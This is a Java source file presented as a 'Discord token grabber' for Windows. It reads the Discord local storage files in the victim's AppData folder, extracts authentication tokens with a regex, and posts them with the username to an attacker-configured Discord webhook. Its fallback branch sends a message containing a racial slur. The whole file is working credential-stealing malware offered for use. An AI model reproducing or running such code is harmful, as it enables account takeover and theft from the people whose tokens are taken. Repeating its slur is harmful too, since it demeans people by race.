/*
Created by XEFER on 14/03/2020
Discord token grabber for windows
*/

import java.io.BufferedReader; 
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
public class DiscordGrabber {
	
    private static String username = System.getProperty("user.name"); //Get username to later use in the path
    private static String DiscordWebhookLink = ""; //Fill in your discord webhook where you want the tokens sent to
    private static String BOTName = ""; //give the bot a name
    private static String BOTImageURL = ""; // give the bot a face
	
	public static void main(String[] args) throws IOException {

        String os = System.getProperty("os.name"); //get os names, because discord is saved in different directories depending on the os
        
        
        

        if(os.contains("Windows")) { //if it is any type of windows, do this
            String path = System.getProperty("user.home") +"/AppData/Roaming/Discord/Local Storage/leveldb/"; //Set the path to discord path 
            String username = System.getProperty("user.name"); 

            String[] pathnames; //create an empty array

            File f = new File(path); //set file to the path

            pathnames = f.list(); // list all the files in the path (because token is in one of the files)
        	
        	
        	for (String pathname : pathnames) { //iterate through all the files in the path
                try {
                    FileInputStream fstream = new FileInputStream(path + pathname); //for reading the file
                    DataInputStream in = new DataInputStream(fstream); // for reading the file
                    BufferedReader br = new BufferedReader(new InputStreamReader(in)); //for reading the file
                    String strLine; //make a new string
                    while ((strLine = br.readLine()) != null) { //while the token has not been found, read the next line

                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                        Matcher m = p.matcher(strLine); //match the pattern to the contents of the file

                        while (m.find()) { //everytime a token is found
                    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink); //this
                            webhook.setContent(username + "  -  " + m.group()); //gets
                            webhook.setAvatarUrl(BOTImageURL); //executed
                            webhook.setUsername(BOTName); //this 
                            webhook.setTts(false);// just 
                            webhook.execute(); //sends 
                        } //it
                    }

                } catch (Exception e) {}
            }
        }else { //if the token is not found
    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink);
            webhook.setContent(username + "  -  " + " this nigga uses " + os); //say which os the nigga uses
            webhook.setAvatarUrl(BOTImageURL);
            webhook.setUsername(BOTName);
            webhook.setTts(false);
            webhook.execute();
        }
        	
        }      
}
